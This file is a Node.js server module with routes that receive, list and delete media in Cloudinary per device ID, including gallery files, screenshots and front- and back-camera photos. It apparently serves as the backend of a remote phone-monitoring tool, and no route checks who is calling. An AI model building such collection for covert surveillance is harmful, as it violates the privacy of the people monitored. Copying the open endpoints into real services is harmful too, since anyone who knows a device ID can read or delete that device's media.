'use strict';

const crypto = require('crypto');
const cloudinary = require('cloudinary').v2;

// GET /api/gallery-fallback-list/:device_id
async function galleryFallbackList(req, res) {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;
    const requestedType = String(req.query.media_type || 'all').toLowerCase();
    const list = (resourceType) => new Promise(resolve => cloudinary.api.resources({
        type: 'upload', resource_type: resourceType, prefix: id + '/gallery/', max_results: 50,
        next_cursor: next_cursor, direction: 'desc'
    }, (error, result) => resolve(error ? { resources: [], next_cursor: null } : { resources: result.resources || [], next_cursor: result.next_cursor || null })));
    try {
        const resourceTypes = requestedType === 'videos' ? ['video'] : requestedType === 'images' ? ['image'] : ['image', 'video'];
        const listed = await Promise.all(resourceTypes.map(list));
        const resources = listed.flatMap(x => x.resources)
            .sort((a, b) => new Date(b.created_at || 0) - new Date(a.created_at || 0));
        const responseCursor = resourceTypes.length === 1 ? listed[0].next_cursor : null;
        const photos = resources.map(resource => ({
            id: resource.public_id.split('/').pop(), url: resource.secure_url,
            name: resource.public_id.split('/').pop(),
            mime: resource.resource_type === 'video' ? `video/${resource.format || 'mp4'}` : `image/${resource.format || 'jpeg'}`,
            type: resource.resource_type, size: resource.bytes || 0,
            modifiedAt: resource.created_at ? Date.parse(resource.created_at) : Date.now(),
            source: 'cloudinary-fallback', publicId: resource.public_id, resourceType: resource.resource_type
        }));
        res.json({ photos, next_cursor: responseCursor });
    } catch (error) { res.json({ photos: [], next_cursor: null }); }
}

// GET /api/gallery-list/:device_id
function galleryList(req, res) {
    res.json({ photos: [], next_cursor: null, mode: 'p2p-first', fallbackEndpoint: '/api/gallery-fallback-list/' + encodeURIComponent(req.params.device_id) });
}

// POST /api/upload-gallery-fallback
function uploadGalleryFallback(req, res, io) {
    const body = req.body || {};
    const id = String(body.device_id || '').trim().toUpperCase();
    const mediaData = String(body.media_data || '');
    const mime = String(body.mime || 'image/jpeg');
    if (!id || !mediaData) return res.status(400).json({ error: 'No gallery fallback data' });
    const dataUri = mediaData.startsWith('data:') ? mediaData : `data:${mime};base64,${mediaData}`;
    const publicId = String(body.public_id || `${Date.now()}_${crypto.randomBytes(4).toString('hex')}`)
        .replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
    const resourceType = mime.startsWith('video/') ? 'video' : 'image';
    cloudinary.uploader.upload(dataUri, {
        folder: `${id}/gallery`,
        public_id: publicId,
        resource_type: resourceType,
        width: resourceType === 'image' ? 1280 : undefined,
        quality: resourceType === 'image' ? 'auto' : undefined,
        fetch_format: resourceType === 'image' ? 'auto' : undefined
    }, (error, result) => {
        if (error) return res.status(500).json({ error: 'Gallery fallback upload failed' });
        const item = {
            id: publicId, url: result.secure_url,
            name: String(body.name || publicId),
            mime, type: resourceType,
            size: Number(body.size || result.bytes || 0),
            modifiedAt: Number(body.modifiedAt || Date.now()),
            source: 'cloudinary-fallback',
            publicId: result.public_id, resourceType
        };
        io.to(id).emit('new-file', { device_id: id, ...item });
        res.json({ status: 'success', item });
    });
}

// POST /api/delete-gallery-fallback
function deleteGalleryFallback(req, res) {
    const publicId = String((req.body || {}).publicId || '').trim();
    const resourceType = String((req.body || {}).resourceType || 'image') === 'video' ? 'video' : 'image';
    if (!publicId || publicId.includes('..')) return res.status(400).json({ error: 'Invalid public id' });
    cloudinary.uploader.destroy(publicId, { resource_type: resourceType, invalidate: true }, (error, result) => {
        if (error) return res.status(500).json({ error: 'Delete failed' });
        res.json({ status: 'success', result: result.result });
    });
}

// GET /api/screenshots-list/:device_id
function screenshotsList(req, res) {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;
    cloudinary.api.resources({
        type: 'upload', prefix: id + "/screenshot/",
        max_results: 100, next_cursor: next_cursor, direction: 'desc'
    }, (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
}

// GET /api/camera-list/:device_id
async function cameraList(req, res) {
    const id = req.params.device_id.toUpperCase();
    try {
        const getPhotos = (folder) => new Promise(resolve => {
            cloudinary.api.resources({
                type: 'upload', prefix: `${id}/${folder}/`,
                max_results: 50, direction: 'desc'
            }, (error, result) => resolve(result && result.resources ? result.resources : []));
        });
        const [front, back] = await Promise.all([
            getPhotos('front_camera'),
            getPhotos('back_camera')
        ]);
        let allPhotos = [...front, ...back];
        allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
        const photos = allPhotos.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: null });
    } catch (error) {
        res.json({ photos: [], next_cursor: null });
    }
}

module.exports = {
    galleryFallbackList, galleryList, uploadGalleryFallback,
    deleteGalleryFallback, screenshotsList, cameraList
};
